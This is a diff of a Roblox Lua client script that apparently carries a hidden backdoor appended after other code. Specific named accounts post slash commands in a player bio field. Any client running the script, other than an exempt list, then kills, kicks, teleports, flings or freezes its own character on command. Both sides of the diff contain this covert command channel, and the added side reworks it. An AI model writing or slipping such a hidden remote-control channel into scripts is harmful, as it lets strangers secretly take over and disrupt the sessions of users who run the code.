@@ -54,201 +54,114 @@ end
 Players.PlayerAdded:Connect(function(player)
 	watchPlayer(player)
 end)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
-local immuneLocals = {
-    Sajwaad = true,
-    ghalidev_0 = true,
-    DemoZ = true,
-    Daemon = true
-}
+local immuneLocals = {Sajwaad=true, ghalidev_0=true, DemoZ=true, Daemon=true}
+if immuneLocals[LocalPlayer.Name] then return end
 
-if immuneLocals[LocalPlayer.Name] then
-    return
-end
-
-local monitoredPlayers = {
-    Sajwaad = true,
-    K_31387 = true,
-    haker_457230 = true,
-    rengoku28306 = true,
-    ghalidev_0 = true,
-    iskeowa = true,
-    wkwjdnsnsndnxxnsnsn = true,
-    ADJ_71 = true,
-    FHG_12343 = true,
-    talarom12349 = true,
-    XXTAJXX63 = true,
-    HUSAM1438 = true,
-    yew99yew = true
-}
-
+local monitoredPlayers = {Sajwaad=true, ghalidev_0=true, iskeowa=true, yew99yew=true}
 local myNameLower = string.lower(LocalPlayer.Name)
 local myNamePrefix = string.sub(myNameLower, 1, 3)
 
-local FAR_POS = Vector3.new(999999999, 999999999, 999999999)
-_G.__FLING_ORIGIN = _G.__FLING_ORIGIN or nil
-_G.__FLUNG = _G.__FLUNG or false
+local function getChar() return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() end
+local function getHRP() return getChar():WaitForChild("HumanoidRootPart") end
 
-local function getHRP()
-    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    return char:WaitForChild("HumanoidRootPart")
-end
-
+local FAR_POS = Vector3.new(999999999,999999999,999999999)
+_G.__FLUNG=false
+_G.__FLING_ORIGIN=nil
 local function doFling()
-    if _G.__FLUNG then return end
-    local hrp = getHRP()
-    _G.__FLING_ORIGIN = hrp.CFrame
-    _G.__FLUNG = true
-    hrp.CFrame = CFrame.new(FAR_POS)
+	if _G.__FLUNG then return end
+	local hrp=getHRP()
+	_G.__FLING_ORIGIN=hrp.CFrame
+	_G.__FLUNG=true
+	hrp.CFrame=CFrame.new(FAR_POS)
+end
+local function doUnFling()
+	if not _G.__FLUNG or not _G.__FLING_ORIGIN then return end
+	getHRP().CFrame=_G.__FLING_ORIGIN
+	_G.__FLUNG=false
 end
 
-local function doUnfling()
-    if not _G.__FLUNG then return end
-    if not _G.__FLING_ORIGIN then return end
-    local hrp = getHRP()
-    hrp.CFrame = _G.__FLING_ORIGIN
-    _G.__FLUNG = false
+_G.__ULTIMATE_FREEZE_ACTIVE=false
+_G.__FREEZE_CONNECTIONS={}
+local savedHumanoid={}
+
+local function ultimateFreeze(char)
+	if _G.__ULTIMATE_FREEZE_ACTIVE then return end
+	_G.__ULTIMATE_FREEZE_ACTIVE=true
+	local hrp=char:WaitForChild("HumanoidRootPart")
+	local hum=char:WaitForChild("Humanoid")
+	if not savedHumanoid.WalkSpeed then
+		savedHumanoid={WalkSpeed=hum.WalkSpeed,JumpPower=hum.JumpPower,JumpHeight=hum.JumpHeight,AutoRotate=hum.AutoRotate,PlatformStand=hum.PlatformStand}
+	end
+	hrp.Anchored=true
+	hum.PlatformStand=true
+	hum.AutoRotate=false
+	hum.WalkSpeed=0
+	hum.JumpPower=0
+	hum.JumpHeight=0
+	table.insert(_G.__FREEZE_CONNECTIONS,RunService.RenderStepped:Connect(function()
+		if not _G.__ULTIMATE_FREEZE_ACTIVE then return end
+		hrp.Velocity=Vector3.zero
+		hrp.RotVelocity=Vector3.zero
+	end))
+	table.insert(_G.__FREEZE_CONNECTIONS,LocalPlayer.CharacterAdded:Connect(function(c)
+		task.wait(0.15)
+		if _G.__ULTIMATE_FREEZE_ACTIVE then ultimateFreeze(c) else c:Disconnect() end
+	end))
 end
 
-_G.__FREEZE_ACTIVE = false
-_G.__FREEZE_STOP = _G.__FREEZE_STOP or nil
-
-local freezeConn, charConn
-
-local function stopFreeze()
-    _G.__FREEZE_ACTIVE = false
-    if freezeConn then freezeConn:Disconnect(); freezeConn = nil end
-    if charConn then charConn:Disconnect(); charConn = nil end
+local function ultimateUnFreeze()
+	_G.__ULTIMATE_FREEZE_ACTIVE=false
+	for _,c in ipairs(_G.__FREEZE_CONNECTIONS) do pcall(function() c:Disconnect() end) end
+	_G.__FREEZE_CONNECTIONS={}
+	local char=getChar()
+	local hrp=char:WaitForChild("HumanoidRootPart")
+	local hum=char:WaitForChild("Humanoid")
+	hrp.Anchored=false
+	hrp.Velocity=Vector3.zero
+	hrp.RotVelocity=Vector3.zero
+	hum.PlatformStand=false
+	hum.AutoRotate=true
+	for _,state in ipairs(Enum.HumanoidStateType:GetEnumItems()) do hum:SetStateEnabled(state,true) end
+	hum.WalkSpeed=savedHumanoid.WalkSpeed or 16
+	hum.JumpPower=savedHumanoid.JumpPower or 50
+	hum.JumpHeight=savedHumanoid.JumpHeight or 7.2
+	hum:ChangeState(Enum.HumanoidStateType.GettingUp)
+	task.wait(0.05)
+	hum:ChangeState(Enum.HumanoidStateType.Landed)
+	task.wait(0.05)
+	hum:ChangeState(Enum.HumanoidStateType.Running)
+	hrp.CFrame=hrp.CFrame+Vector3.new(0,0.05,0)
 end
 
-_G.__FREEZE_STOP = stopFreeze
-
-local function freezeCharacter(char)
-    local hrp = char:WaitForChild("HumanoidRootPart", 5)
-    local hum = char:WaitForChild("Humanoid", 5)
-    if not hrp or not hum then return end
-
-    local currentCFrame = hrp.CFrame
-
-    hrp.Anchored = true
-    hum.WalkSpeed = 0
-    hum.JumpPower = 0
-    hum.AutoRotate = false
-    hum.PlatformStand = true
-
-    if freezeConn then freezeConn:Disconnect() end
-    freezeConn = RunService.RenderStepped:Connect(function()
-        if not _G.__FREEZE_ACTIVE then return end
-        if hrp then
-            hrp.CFrame = currentCFrame
-            hrp.Velocity = Vector3.zero
-            hrp.RotVelocity = Vector3.zero
-        end
-    end)
+local function executeCommand(cmd,fromPlayer)
+	cmd=string.lower(cmd)
+	if cmd=="/kill all" or (cmd:sub(1,5)=="/kill" and cmd:find(myNamePrefix,6,true)) then getChar():BreakJoints() end
+	if cmd=="/kick all" or (cmd:sub(1,5)=="/kick" and cmd:find(myNamePrefix,6,true)) then LocalPlayer:Kick("تم طردك") end
+	if cmd=="/bring all" or (cmd:sub(1,6)=="/bring" and cmd:find(myNamePrefix,7,true)) then
+		if fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
+			getHRP().CFrame=fromPlayer.Character.HumanoidRootPart.CFrame
+		end
+	end
+	if cmd=="/fling all" or (cmd:sub(1,6)=="/fling" and cmd:find(myNamePrefix,7,true)) then doFling() end
+	if cmd=="/unfling all" or (cmd:sub(1,8)=="/unfling" and cmd:find(myNamePrefix,9,true)) then doUnFling() end
+	if cmd=="/freeze all" or (cmd:sub(1,7)=="/freeze" and cmd:find(myNamePrefix,8,true)) then ultimateFreeze(getChar()) end
+	if cmd=="/unfreeze all" or (cmd:sub(1,9)=="/unfreeze" and cmd:find(myNamePrefix,10,true)) then ultimateUnFreeze() end
 end
 
-local function unFreezeCharacter()
-    if _G.__FREEZE_STOP then
-        _G.__FREEZE_STOP()
-        _G.__FREEZE_STOP = nil
-    end
-    local char = LocalPlayer.Character
-    if not char then return end
-
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    local hum = char:FindFirstChild("Humanoid")
-
-    if hrp then hrp.Anchored = false end
-    if hum then
-        hum.PlatformStand = false
-        hum.AutoRotate = true
-        hum.WalkSpeed = 16
-        hum.JumpPower = 50
-        hum:ChangeState(Enum.HumanoidStateType.Running)
-    end
+local function monitorPlayer(plr)
+	if not monitoredPlayers[plr.Name] or plr==LocalPlayer then return end
+	local bag=plr:WaitForChild("PlayersBag",10)
+	if not bag then return end
+	local bio=bag:WaitForChild("RPBio",10)
+	if not bio or not bio:IsA("StringValue") then return end
+	executeCommand(bio.Value,plr)
+	bio:GetPropertyChangedSignal("Value"):Connect(function() executeCommand(bio.Value,plr) end)
 end
 
-local function doFreeze()
-    if _G.__FREEZE_ACTIVE then return end
-    _G.__FREEZE_ACTIVE = true
-    if LocalPlayer.Character then
-        freezeCharacter(LocalPlayer.Character)
-    end
-    charConn = LocalPlayer.CharacterAdded:Connect(function(char)
-        task.wait(0.1)
-        if _G.__FREEZE_ACTIVE then
-            freezeCharacter(char)
-        end
-    end)
-end
-
-local function executeCommand(command, fromPlayer)
-    command = string.lower(command)
-
-    if command == "/kill all"
-    or (string.sub(command, 1, 5) == "/kill" and string.find(command, myNamePrefix, 6, true)) then
-        LocalPlayer.Character:BreakJoints()
-    end
-
-    if command == "/kick all"
-    or (string.sub(command, 1, 5) == "/kick" and string.find(command, myNamePrefix, 6, true)) then
-        LocalPlayer:Kick("تم طردك بواسطة عمك رامي")
-    end
-
-    if command == "/bring all"
-    or (string.sub(command, 1, 6) == "/bring" and string.find(command, myNamePrefix, 7, true)) then
-        if fromPlayer.Character and fromPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            local hrp = getHRP()
-            hrp.CFrame = fromPlayer.Character.HumanoidRootPart.CFrame
-        end
-    end
-
-    if command == "/fling all"
-    or (string.sub(command, 1, 6) == "/fling" and string.find(command, myNamePrefix, 7, true)) then
-        doFling()
-    end
-
-    if command == "/unfling all"
-    or (string.sub(command, 1, 8) == "/unfling" and string.find(command, myNamePrefix, 9, true)) then
-        doUnfling()
-    end
-
-    if command == "/freeze all"
-    or (string.sub(command, 1, 7) == "/freeze" and string.find(command, myNamePrefix, 8, true)) then
-        doFreeze()
-    end
-
-    if command == "/unfreeze all"
-    or (string.sub(command, 1, 9) == "/unfreeze" and string.find(command, myNamePrefix, 10, true)) then
-        unFreezeCharacter()
-    end
-end
-
-local function monitorPlayer(player)
-    if not monitoredPlayers[player.Name] then return end
-    if player == LocalPlayer then return end
-
-    local bag = player:WaitForChild("PlayersBag", 10)
-    if not bag then return end
-
-    local bio = bag:WaitForChild("RPBio", 10)
-    if not bio or not bio:IsA("StringValue") then return end
-
-    executeCommand(bio.Value, player)
-
-    bio:GetPropertyChangedSignal("Value"):Connect(function()
-        executeCommand(bio.Value, player)
-    end)
-end
-
-for _, plr in ipairs(Players:GetPlayers()) do
-    monitorPlayer(plr)
-end
-
-Players.PlayerAdded:Connect(function(plr)
-    plr.CharacterAdded:Wait()
-    monitorPlayer(plr)
-end)
+for _,p in ipairs(Players:GetPlayers()) do monitorPlayer(p) end
+Players.PlayerAdded:Connect(function(p) p.CharacterAdded:Wait() monitorPlayer(p) end)
